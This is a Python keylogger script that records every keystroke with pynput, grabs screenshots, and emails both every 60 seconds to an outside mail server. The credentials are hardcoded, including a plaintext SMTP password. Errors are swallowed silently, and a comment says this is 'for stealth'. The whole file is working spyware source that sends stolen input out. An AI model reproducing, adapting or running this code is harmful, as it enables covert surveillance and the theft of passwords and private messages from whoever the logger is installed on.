import smtplib
import threading
import tempfile
import time
import random
import os
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard
import pyscreenshot

# 1. INITIALIZATION
EMAIL_SENDER = "keylog@fks5.net"
EMAIL_RECIPIENT = "keylog@fks5.net"
EMAIL_PASSWORD = "ppxoVyStb+"
SMTP_SERVER = "mail.fks5.net"
SMTP_PORT = 465
REPORT_INTERVAL = 60  # X minutes (in seconds)

class KeyloggerSMTP:
    def __init__(self):
        self.log_buffer = ""
        self.running = True
        self.timer = None
        
    # 2. KEY CAPTURE
    def on_key_press(self, key):
        """Hook into keyboard events - append key to log buffer"""
        try:
            # Regular characters
            if hasattr(key, 'char') and key.char:
                self.log_buffer += key.char
            # Special keys
            elif key == keyboard.Key.space:
                self.log_buffer += " "
            elif key == keyboard.Key.enter:
                self.log_buffer += "\n"
            elif key == keyboard.Key.backspace:
                if self.log_buffer:
                    self.log_buffer = self.log_buffer[:-1]
            elif key == keyboard.Key.tab:
                self.log_buffer += "[TAB]"
            else:
                # Other special keys
                key_name = str(key).replace('Key.', '').upper()
                if key_name not in ['SHIFT', 'CTRL_L', 'CTRL_R', 'ALT_L', 'ALT_R']:
                    self.log_buffer += f"[{key_name}]"
        except:
            pass
    
    # 3. REPORTING LOOP
    def start_reporting_loop(self):
        """Run background thread at regular intervals"""
        if self.running:
            # Take current log and format it
            current_log = self.log_buffer
            
            if current_log.strip():  # Only send if there's data
                # Format into email-friendly message
                formatted_message = self.format_log_message(current_log)
                
                # Send to SMTP server
                self.send_via_smtp(formatted_message)
                
                # Clear/reset log for next cycle
                self.log_buffer = ""
            
            # Schedule next report
            self.timer = threading.Timer(REPORT_INTERVAL, self.start_reporting_loop)
            self.timer.start()
    
    def format_log_message(self, log_data):
        """Format log into email-friendly message"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        return f"=== Keylog Report {timestamp} ===\n\n{log_data}\n\n=== End Report ==="
    
    # 4. SEND VIA SMTP
    def send_via_smtp(self, message):
        """Send email with log data"""
        try:
            # Create email object
            msg = MIMEMultipart()
            msg['From'] = EMAIL_SENDER
            msg['To'] = EMAIL_RECIPIENT
            msg['Subject'] = f"Keylog Report {datetime.now().strftime('%H:%M')}"
            
            # Add body
            msg.attach(MIMEText(message, 'plain'))
            
            # Optional: Add screenshot attachment
            self.add_screenshot_attachment(msg)
            
            # Connect to SMTP server
            with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT, timeout=15) as server:
                # Authenticate
                server.login(EMAIL_SENDER, EMAIL_PASSWORD)
                
                # Send message
                server.sendmail(EMAIL_SENDER, EMAIL_RECIPIENT, msg.as_string())
                
                # Disconnect (automatic with 'with' statement)
            
        except Exception:
            pass  # Silent failure for stealth
    
    def add_screenshot_attachment(self, msg):
        """Optional: Add screenshot to email"""
        try:
            temp_file = os.path.join(tempfile.gettempdir(), f"img{random.randint(100,999)}.png")
            
            # Capture screenshot
            img = pyscreenshot.grab()
            img.save(temp_file)
            
            # Attach to email
            with open(temp_file, "rb") as f:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', 'attachment; filename=screenshot.png')
                msg.attach(part)
            
            # Cleanup
            os.remove(temp_file)
            
        except:
            pass
    
    # 5. EXIT / STOP HANDLING
    def start(self):
        """Keep logger running until manually stopped"""
        try:
            # Start reporting loop
            self.start_reporting_loop()
            
            # Start keyboard listener
            with keyboard.Listener(on_press=self.on_key_press) as listener:
                listener.join()
                
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Gracefully close sockets/threads when exiting"""
        self.running = False
        if self.timer:
            self.timer.cancel()

# Main execution
if __name__ == "__main__":
    logger = KeyloggerSMTP()
    logger.start()
